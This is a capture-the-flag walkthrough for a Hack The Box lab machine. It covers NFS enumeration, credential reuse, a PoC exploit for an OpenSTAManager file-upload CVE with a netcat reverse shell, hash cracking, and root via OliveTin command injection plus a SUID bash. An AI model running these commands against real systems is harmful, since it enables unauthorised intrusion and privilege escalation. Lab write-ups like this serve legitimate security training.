# HTB - Enigma (Easy)
**Difficulty:** Easy
**OS:** Linux

## Tools Used
- nmap
- Browser
- curl
- git
- mysql
- john
- netcat

## Steps
1. Ran `nmap -sV <IP>` — found SSH, HTTP, POP3, IMAP, NFS
2. Mounted NFS share: `sudo mount -t nfs <IP>:/srv/nfs/onboarding /tmp/nfs`
3. Found `New_Employee_Access.pdf` — credentials: `kevin:*******`
4. Added `mail001.enigma.htb` to `/etc/hosts`
5. Logged into webmail at `http://mail001.enigma.htb` — found welcome email from sarah
6. Added `enigma.htb` to `/etc/hosts` — visited corporate website, nothing useful
7. Added `support_001.enigma.htb` to `/etc/hosts` — found OpenSTAManager login
8. Logged into OpenSTAManager with `admin:*******` (password recovered from sarah's mailbox via IMAP)
9. Identified CVE-2026-38751 — arbitrary file upload in OpenSTAManager ≤ 2.10
10. Cloned exploit: `git clone https://github.com/Mkps/CVE-2026-38751-OpenSTAManager-Arbitrary-File-Upload-PoC`
11. Fixed missing import: `sed -i '1s/^/from itertools import count\n/' cve-2026-38751.py`
12. Set up listener: `nc -lvnp 4444`
13. Ran exploit: `python3 cve-2026-38751.py admin ******* http://support_001.enigma.htb --lhost <IP> --lport 4444`
14. Got shell as `www-data`
15. Found DB credentials in `/var/www/html/openstamanager/config.inc.php`: `brollin:*******`
16. Dumped users: `mysql -u brollin -p'******' openstamanager -e "SELECT username,password FROM zz_users;"`
17. Found bcrypt hash for `haris` — cracked with john: password `*******`
18. Switched to haris: `su haris`
19. Read user flag: `cat /home/haris/user.txt`
20. Found OliveTin running as root on port 1337
21. Used `backup_database` action with command injection in `db_pass` parameter
22. Created SUID bash: `install -m 4755 /bin/bash /tmp/.bs`
23. Got root shell: `/tmp/.bs -p`
24. Read root flag: `cat /root/root.txt`

## What I Learned
- NFS shares can expose sensitive documents publicly
- Always check for virtual hosts — `support_001.enigma.htb` was hidden
- OpenSTAManager CVE-2026-38751 allows RCE via malicious module upload
- Database config files often contain reusable credentials
- OliveTin runs actions as root — command injection leads to privilege escalation
- SUID bash (`install -m 4755`) is a clean privilege escalation technique
